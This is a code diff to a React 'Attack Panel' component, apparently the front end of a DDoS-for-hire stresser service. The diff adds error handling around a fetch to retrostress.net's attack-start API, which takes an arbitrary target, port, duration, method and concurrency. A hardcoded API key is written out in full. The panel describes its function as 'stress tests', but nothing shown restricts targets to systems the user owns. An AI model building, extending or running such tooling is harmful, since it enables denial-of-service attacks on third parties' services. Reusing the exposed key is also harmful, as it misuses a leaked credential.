@@ -13,6 +13,7 @@ export default function Panel() {
   const [subnet, setSubnet] = useState('/32 — Host (1)');
   const [isAttacking, setIsAttacking] = useState(false);
   const [activeTasks, setActiveTasks] = useState([]);
+  const [apiError, setApiError] = useState(null);
   
   const [activePlan, setActivePlan] = useState('None');
   const [loadingPlan, setLoadingPlan] = useState(true);
@@ -92,13 +93,23 @@ export default function Panel() {
     // Hit the L4 API if layer is L4
     if (layer === 'L4') {
       try {
+        setApiError(null);
         const apiKey = "639c040c5f5a16ffe9b56de90f3831cf5df5364524bc5610003efc864493b5b5"; 
         const apiUrl = `https://retrostress.net/api/start?key=${apiKey}&target=${target}&port=${port || '80'}&time=${finalDuration}&method=${method}&concurrent=${finalConns}`;
         
-        // We use mode: 'no-cors' so the browser doesn't block the request if the API server lacks CORS headers
-        await fetch(apiUrl, { mode: 'no-cors' }); 
+        // Removed mode: 'no-cors' so we can read the response status and text
+        const response = await fetch(apiUrl);
+        if (!response.ok) {
+           const errorText = await response.text();
+           setApiError(errorText || `API returned status ${response.status}`);
+           setIsAttacking(false);
+           return;
+        }
       } catch (err) {
         console.error("API Hit Error:", err);
+        setApiError(err.message || "Failed to connect to API");
+        setIsAttacking(false);
+        return;
       }
     }
 
@@ -143,6 +154,23 @@ export default function Panel() {
         <h1 className="h1" style={{ marginBottom: '4px' }}>Attack Panel</h1>
         <p className="text-secondary" style={{ fontSize: '0.875rem' }}>Configure and launch network stress tests.</p>
       </div>
+
+      {apiError && (
+        <div style={{ 
+          background: 'rgba(239, 68, 68, 0.1)', 
+          border: '1px solid rgba(239, 68, 68, 0.2)', 
+          color: '#f87171',
+          padding: '16px 20px', 
+          borderRadius: '12px', 
+          fontSize: '0.9rem', 
+          display: 'flex',
+          alignItems: 'center',
+          gap: '10px'
+        }}>
+          <ShieldAlert size={20} />
+          <span><strong>Attack Failed:</strong> {apiError}</span>
+        </div>
+      )}
 
       <div className="panel-container-grid">
         
